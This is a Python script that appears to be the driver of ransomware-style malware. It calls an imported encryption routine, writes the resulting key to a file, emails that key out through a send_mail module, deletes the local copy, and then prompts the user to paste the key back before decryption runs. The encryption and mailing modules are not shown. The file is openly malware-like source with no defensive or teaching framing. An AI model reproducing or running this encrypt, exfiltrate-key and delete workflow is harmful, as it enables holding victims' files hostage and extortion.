import encrypto 
import decrypto
import random
import string
import time
import os

import send_mail

def generate_key():
    # string.punctuation
    symbols = ''.join(['@', '#', '?', '*', '&'])
    key = ''.join(random.choices(symbols + string.ascii_uppercase + string.digits + string.ascii_lowercase, k=31))
    return key

def write_key_to_file(key, file_path):
    with open(file_path, 'wb') as file:
        file.write(key)

def main():
    # list_randomKey = []

    # for _ in range(10):
    #     random_key = generate_key()
    #     list_randomKey.append(random_key)

    # with open('req.txt', 'w') as f:
    #     f.write('\n'.join(list_randomKey))

    # print(list_randomKey)
    # time.sleep(7)
    file_path = "_key.txt"
    key = encrypto.main_encrypto() 
    write_key_to_file(key, file_path)
    send_mail.send_private_key(file_path)
    os.remove(file_path)
    input('Please paste key_file and press enter',)
    decrypto.main_decrypto(key)

if __name__=="__main__":
    main()

